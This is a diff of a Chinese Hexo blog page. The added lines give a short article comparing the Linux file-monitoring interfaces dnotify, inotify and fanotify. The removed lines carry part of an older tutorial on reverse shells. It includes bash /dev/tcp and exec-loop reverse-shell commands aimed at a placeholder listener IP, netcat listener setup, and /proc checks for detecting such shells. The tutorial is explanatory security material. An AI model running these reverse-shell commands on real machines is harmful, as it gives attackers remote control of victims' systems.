@@ -6,18 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Jesse Tsui的博客</title>
+  <title>Linux文件事件监控 | Jesse Tsui的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="燕山大学在读研究生，创造出风靡全球的机器人产品是我毕生的追求。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Jesse Tsui的博客">
-<meta property="og:url" content="http://yoursite.com/page/2/index.html">
+  <meta name="description" content="0x00 引言&amp;emsp;&amp;emsp;在内核态很容易监控文件的创建、删除、修改等事件，但是Linux也提供了一些工具，方便使用者在用户态仍能够监控文件事件。从发展历程来看，主要经历了dnotify、inotify以及fanotify阶段。&amp;emsp;&amp;emsp;Linux的文件事件监听的原理并不复杂，简单说就是当一个应用层的进程操作一个目录或文件时，会触发系统调用，此时内核就可以把该进程对文件的操">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux文件事件监控">
+<meta property="og:url" content="http://yoursite.com/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/index.html">
 <meta property="og:site_name" content="Jesse Tsui的博客">
-<meta property="og:description" content="燕山大学在读研究生，创造出风靡全球的机器人产品是我毕生的追求。">
+<meta property="og:description" content="0x00 引言&amp;emsp;&amp;emsp;在内核态很容易监控文件的创建、删除、修改等事件，但是Linux也提供了一些工具，方便使用者在用户态仍能够监控文件事件。从发展历程来看，主要经历了dnotify、inotify以及fanotify阶段。&amp;emsp;&amp;emsp;Linux的文件事件监听的原理并不复杂，简单说就是当一个应用层的进程操作一个目录或文件时，会触发系统调用，此时内核就可以把该进程对文件的操">
 <meta property="og:locale">
+<meta property="og:image" content="http://yoursite.com/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/用户态文件事件监控.jpg">
+<meta property="og:image" content="http://yoursite.com/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/fanotify监控流程.jpg">
+<meta property="article:published_time" content="2022-04-22T07:00:01.000Z">
+<meta property="article:modified_time" content="2022-04-22T07:34:05.138Z">
 <meta property="article:author" content="JailbreakFox">
-<meta property="article:tag" content="极客,geek,开源,机器人,robot,游戏制作,game,hacker,黑客,口琴,布鲁斯,blues">
+<meta property="article:tag" content="计算机技术">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/用户态文件事件监控.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Jesse Tsui的博客" type="application/atom+xml">
   
@@ -154,84 +159,86 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-Linux网络管理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Linux文件事件监控" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/">Linux网络管理</a>
+    <h1 class="article-title" itemprop="name">
+      Linux文件事件监控
     </h1>
   
 
         
-        <a href="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/" class="archive-article-date">
-  	<time datetime="2021-12-10T02:40:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-10</time>
+        <a href="/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/" class="archive-article-date">
+  	<time datetime="2022-04-22T07:00:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-22</time>
 </a>
         
+        
+          <span class="archive-article-date">
+            阅读量 <span id="busuanzi_value_page_pv"></span>
+          </span>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp;Linux系统下，防火墙在内核态是使用netfilter实现的，而iptables则是为了方便用户在用户态控制防火墙的规则而产生的。<br>&emsp;&emsp;iptables通过指定规则(源地址、目的地址、传输协议(如TCP、UDP、ICMP)和服务类型(如HTTP、FTP和SMTP)等)，当数据包与规则匹配时做相应处理(放行(accept)、拒绝(reject)和丢弃(drop)等)。<br>&emsp;&emsp;iptables控制数据包传递的总体流程图如下:  </p>
+        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp;在内核态很容易监控文件的创建、删除、修改等事件，但是Linux也提供了一些工具，方便使用者在用户态仍能够监控文件事件。从发展历程来看，主要经历了dnotify、inotify以及fanotify阶段。<br>&emsp;&emsp;Linux的文件事件监听的原理并不复杂，简单说就是当一个应用层的进程操作一个目录或文件时，会触发系统调用，此时内核就可以把该进程对文件的操作上报给应用层的监听进程。  </p>
 <div align="center">
-<img src="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/iptables链表.png">
+<img src="/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/用户态文件事件监控.jpg" width="500" height="250">
 <div align="left">  
 
-<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a><em>0x01 基础知识</em></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 五链四表</span><br><span class="line">  1.1 五链</span><br><span class="line">  1.2 四表</span><br><span class="line">2 堵通策略</span><br></pre></td></tr></table></figure>
-<p><strong><em>1、五链四表</em></strong><br><strong><em>1.1、五链</em></strong>  </p>
-<ul>
-<li>五链 - 数据包从网卡传入，根据其去向必经的五个链条，流程图如下<ul>
-<li>PREROUTING - 路由前</li>
-<li>INPUT - 数据包流入口</li>
-<li>FORWARD - 转发管卡</li>
-<li>OUTPUT - 数据包出口</li>
-<li>POSTROUTING - 路由后</li>
+<h3 id="0x01-dnotify"><a href="#0x01-dnotify" class="headerlink" title="0x01 dnotify"></a><em>0x01 dnotify</em></h3><ul>
+<li>dnotify<ul>
+<li>支持内核: 内核2.4.0以上版本</li>
+<li>缺陷:<ul>
+<li>只能监控文件夹，并且对每个目标文件夹都需要添加监控点</li>
+<li>文件夹umount时有影响</li>
+<li>使用信号的方式通知文件系统事件</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x02-inotify"><a href="#0x02-inotify" class="headerlink" title="0x02 inotify"></a><em>0x02 inotify</em></h3><ul>
+<li>inotify<ul>
+<li>支持内核: 内核2.6.13以上版本</li>
+<li>优点:<ul>
+<li>既可以监视文件，也可以监视目录</li>
+<li>不打开目标对象描述符，所以目标umount时不影响，且生成umount事件通知</li>
+<li>使用系统调用的方式通知文件系统事件，效率高于dnotify</li>
+</ul>
+</li>
+<li>缺点:<ul>
+<li>监控文件夹时不能同时监控子文件夹或子文件，需要添加监控点</li>
+<li>监控点有上限，如果监控目录过深，会影响监控能力</li>
+<li>只能记录或通知文件事件，不能阻止该操作</li>
+<li>不能记录更详细的信息，比如对文件执行操作的进程PID</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="0x03-fanotify"><a href="#0x03-fanotify" class="headerlink" title="0x03 fanotify"></a><em>0x03 fanotify</em></h3><ul>
+<li>fanotify<ul>
+<li>支持内核: 内核2.6.37以上版本</li>
+<li>优点:<ul>
+<li>能同时监控子文件夹或子文件</li>
+<li>无限监控点</li>
+<li>允许介入并改变文件事件的行为</li>
+<li>获取更详细的信息</li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
 <div align="center">
-<img src="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/iptables链.png">
+<img src="/2022/04/22/Linux%E6%96%87%E4%BB%B6%E4%BA%8B%E4%BB%B6%E7%9B%91%E6%8E%A7/fanotify监控流程.jpg" width="450" height="250">
 <div align="left">  
 
-<ul>
-<li>到本机某进程的报文：PREROUTING –&gt; INPUT</li>
-<li>由本机转发的报文：PREROUTING –&gt; FORWARD –&gt; POSTROUTING</li>
-<li>由本机的某进程发出报文（通常为响应报文）：OUTPUT –&gt; POSTROUTING</li>
-</ul>
-<p><strong><em>1.2、四表</em></strong>  </p>
-<ul>
-<li>四表 - 每条链下会有很多用户定义的规则，相同功能的规则被分类为一个表，最后形成了一下四表，图以PREROUTING链为例:<ul>
-<li>raw - 控制nat表中连接追踪机制的启用状况</li>
-<li>mangle - 修改数据包中的原数据</li>
-<li>nat - 控制数据包中地址转换</li>
-<li>filter - 控制数据包是否允许进出及转发</li>
-</ul>
-</li>
-<li>每条链上的规则表有检测的优先级，其优先级排序(由高到低)如下:  <ul>
-<li>raw –&gt; mangle –&gt; nat –&gt; filter</li>
-</ul>
-</li>
-</ul>
-<div align="center">
-<img src="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/iptables表.png">
-<div align="left">  
-
-<p><strong><em>2、堵通策略</em></strong>  </p>
-<ul>
-<li>堵通策略 - 在数据包匹配了规则后，防火墙需要对数据包做出对应操作，常用策略如下:  <ul>
-<li>ACCEPT - 允许数据包通过</li>
-<li>DROP - 不允许数据包通过，不给发送者反馈</li>
-<li>REJECT - 不允许数据包通过，给发送者拒绝反馈</li>
-</ul>
-</li>
-</ul>
-<h3 id="0x02-引用文献"><a href="#0x02-引用文献" class="headerlink" title="0x02 引用文献"></a><em>0x02 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://www.zsythink.net/archives/1199">https://www.zsythink.net/archives/1199</a></p>
-</div></div></div></div></div></div>
+<h3 id="0x04-引用文献"><a href="#0x04-引用文献" class="headerlink" title="0x04 引用文献"></a><em>0x04 引用文献</em></h3><p>[1]<a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man7/fanotify.7.html">https://www.man7.org/linux/man-pages/man7/fanotify.7.html</a><br>[2]<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/186027813">https://zhuanlan.zhihu.com/p/186027813</a></p>
+</div></div></div></div>
       
 
       
@@ -244,7 +251,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">计算机技术 Linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">计算机技术</a>
         		</li>
       		
 		</ul>
@@ -253,16 +260,24 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/10/Linux%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86/">展开全文 >></a>
-        </p>
-      
 
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/04/12/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">端口扫描</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -277,246 +292,32 @@
         </div>
         
         
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-反弹Shell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/">反弹Shell</a>
-    </h1>
-  
-
-        
-        <a href="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/" class="archive-article-date">
-  	<time datetime="2021-09-18T01:21:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-18</time>
-</a>
-        
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00 引言"></a><em>0x00 引言</em></h3><p>&emsp;&emsp;在一套完整的攻击流程中，反弹Shell是非常关键的一步，攻击者可以借此获取受害机器的文件系统控制权。本文介绍常见的几种反弹Shell方法，以及提供一些简单的检测反弹的思路。</p>
-<h3 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01 基础知识"></a><em>0x01 基础知识</em></h3><p>&emsp;&emsp;在开始之前需要先理解什么是反弹Shell，以及学会如何甄别受害机器的特征。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 反弹Shell流程</span><br><span class="line">2 文件描述符</span><br><span class="line">3 重定向</span><br><span class="line">4 查看受害机器的连接状态</span><br></pre></td></tr></table></figure>
-<p><strong><em>1、反弹Shell流程</em></strong><br>&emsp;&emsp;假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。但是在某些情况下，正向连接可能会被阻止，比如防火墙屏蔽。为了解决这个问题，便衍生出了反弹Shell的方法。<br>&emsp;&emsp;反弹Shell，即攻击者指定服务端并开启某端口监听，受害者主机主动连接攻击者的服务端程序。</p>
-<p><strong><em>2、文件描述符</em></strong><br>&emsp;&emsp;linux文件描述符可以理解为linux跟踪打开文件而分配的一个数字句柄，这个数字本质上是一个文件句柄，通过句柄就可以实现文件的读写操作。进程启动后再打开新的文件，描述符会自动依次增加。每一个新进程都会继承其父进程的文件描述符，因此所有的shell命令（本质上也是启动新进程），都会默认有三个文件描述符，即标准输入、标准输出、标准错误输出符号。查看文件描述符的方法是:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ll /proc/<span class="string">&#x27;进程PID&#x27;</span>/fd</span><br><span class="line">$ ls -lah /proc/<span class="string">&#x27;进程PID&#x27;</span>/fd</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 13:46 2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;0代表标准输入，1代表标准输出，2代表标准错误输出。默认情况下其都指向/dev/pts/1这个设备(/dev/tty/0代表终端0，/dev/pts/1代表远程终端1，具体区别<a target="_blank" rel="noopener" href="https://blog.csdn.net/mountzf/article/details/51735691">查看文献</a><sup>[1]</sup>)。</p>
-<p><strong><em>3、重定向</em></strong><br>&emsp;&emsp;Linux支持将标准的输入输出重新指定到其他文件、socket号或者pipe管道上，这里介绍如何进行文件描述符重定向:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入重定向 - &lt;</span></span><br><span class="line"><span class="comment"># 0可以省略</span></span><br><span class="line">$ cat 0&lt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ cat &lt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出重定向 - &gt;</span></span><br><span class="line"><span class="comment"># 默认为标准输出</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> &gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> 1&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">1 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">2 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="comment"># 也可以改为标准错误输出</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;123&quot;</span> 2&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line"><span class="string">&#x27; 重定向后的文件描述符</span></span><br><span class="line"><span class="string">0 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">1 -&gt; /dev/pts/1</span></span><br><span class="line"><span class="string">2 -&gt; &#x27;</span>XXX.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 标准输出与标准错误输出重定向(下面3种形式完全等价)</span></span><br><span class="line">$ ls &gt;&amp; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ ls &amp;&gt; <span class="string">&#x27;XXX.txt&#x27;</span></span><br><span class="line">$ ls &gt; <span class="string">&#x27;XXX.txt&#x27;</span> 2&gt; &amp;1 <span class="comment"># 将标准输出给txt文件,同时将标准错误输出到标准输入设备上</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入重定向到指定设备</span></span><br><span class="line">$ cat &lt; &amp;5 <span class="comment"># 输入重定向到文件描述符5所指向的设备</span></span><br></pre></td></tr></table></figure>
-
-<p><strong><em>4、查看受害机器的连接状态</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定位测试的可疑进程PID</span></span><br><span class="line">$ netstat -natp |grep <span class="string">&#x27;劫持的端口号&#x27;</span></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ ps -ef |grep <span class="string">&#x27;反弹shell命令&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据PID号查看其文件描述符</span></span><br><span class="line"><span class="comment"># 0、1、2 即为标准文件描述符，562245代表socket连接号</span></span><br><span class="line">$ ll /proc/<span class="string">&#x27;PID号&#x27;</span>/fd</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 0 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 1 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 2 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 22 18:17 255 -&gt; /dev/pts/18</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看socket连接状态</span></span><br><span class="line"><span class="comment"># 本地IP:端口为5126320A:0016，将16进制转为10进制，即为81 38 50 10:22，即10.50.38.81:22</span></span><br><span class="line"><span class="comment"># 远程IP:端口为3B1C140A:C9E1，将16进制转为10进制，即为59 28 20 10:51681，即10.20.28.59:51681</span></span><br><span class="line"><span class="comment"># socket连接号为562245</span></span><br><span class="line">$ cat /proc/net/tcp |grep 562245</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode                                                     </span></span><br><span class="line"><span class="string">14: 5126320A:0016 3B1C140A:C9E1 01 00000000:00000000 02:0008870C 00000000     0        0 562245 2 000000005eb7a0ef 22 5 1 17 -1</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看终端中正在运行的进程</span></span><br><span class="line">$ ps -t 1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ ps -a</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">  PID TTY          TIME CMD</span></span><br><span class="line"><span class="string">27306 pts/1    00:00:00 bash</span></span><br><span class="line"><span class="string">29585 pts/1    00:00:00 cat</span></span><br><span class="line"><span class="string">29586 pts/1    00:00:00 bash</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-常见方法"><a href="#0x02-常见方法" class="headerlink" title="0x02 常见方法"></a><em>0x02 常见方法</em></h3><p>&emsp;&emsp;在以下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/12038070.html">方法</a><sup>[2]</sup>中，攻击端大部分均使用nc工具开启端口监听(特殊的攻击端会在特定方法中描述):</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -l 监听模式</span></span><br><span class="line"><span class="comment"># -v 输出交互或错误信息</span></span><br><span class="line"><span class="comment"># -p 本地端口</span></span><br><span class="line">$ nc -lvp <span class="string">&#x27;监听端口&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;且在一个正常的nc服务运行流程中，客户端终端的标准输入输出应该是不会被篡改的，其流程图如下:  </p>
-<div align="center">
-<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/正常流程.png">
-<div align="left">   
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1 内置命令</span><br><span class="line">  1.1 bash直接重定向</span><br><span class="line">  1.2 <span class="built_in">exec</span>添加描述符重定向</span><br><span class="line">  1.3 管道文件</span><br><span class="line">  1.4 匿名双管道</span><br><span class="line">2 第三方工具</span><br><span class="line">  2.1 nc</span><br><span class="line">  2.2 socat</span><br><span class="line">  2.3 python</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>1、内置命令</em></strong><br>&emsp;&emsp;以下几种方法使用Linux内置命令，不需要另外安装工具。  </p>
-<p><strong><em>1.1、bash直接重定向</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span> 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">$ bash -i &gt;&amp; /dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span> &lt;&amp;2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 0 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 1 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 17 16:16 2 -&gt; socket:[1205356]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;使用bash是最简单直接的反弹Shell方法，其原理是将一个终端进程的标准输入输出以及标准错误输出全部重定向到某个socket连接上，实现流程图如下:  </p>
-<div align="center">
-<img src="/2021/09/18/%E5%8F%8D%E5%BC%B9Shell/Bash.png">
-<div align="left">  
-
-<p><strong><em>1.2、exec添加描述符重定向</em></strong>  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 受害机器执行命令</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span>;cat &lt;&amp;5|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> <span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 0 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">l-wx------ 1 root root 64 Sep 18 13:48 1 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 2 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 255 -&gt; /dev/pts/17</span></span><br><span class="line"><span class="string">lrwx------ 1 root root 64 Sep 18 13:48 5 -&gt; socket:[41567]</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;exec命令可以指定一个大于3的文件描述符作为文件的句柄，由于重定向了标准输入输出到大于3的描述符，因此会多产生一个255的文件描述符(在不同终端内，该描述符数字不同)。<a target="_blank" rel="noopener" href="https://blog.csdn.net/worldchinalee/article/details/104049141">while read line句式</a><sup>[3]</sup>能逐行读取输出并将其赋值给line变量，继而在do done内部实现对变量的操作，下面详细分析实现原理:  </p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将远程连接socket的句柄用文件描述符5来表示</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/<span class="string">&#x27;监听IP&#x27;</span>/<span class="string">&#x27;监听端口&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将从socket句柄传来的字符串输出</span></span><br><span class="line">cat &lt;&amp;5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐行读取符号5中传来的命令，并赋值给line变量</span></span><br><span class="line">|<span class="keyword">while</span> <span class="built_in">read</span> line;<span class="keyword">do</span> XXX;<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行line字符串的指令并将标准输入输出以及错误输出重定向到文件描述符5指向的socket</span></span><br><span class="line"><span class="variable">$line</span> &gt;&amp;5 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-
-<p><strong><em>1.3、管道文件</em></strong>  </p>
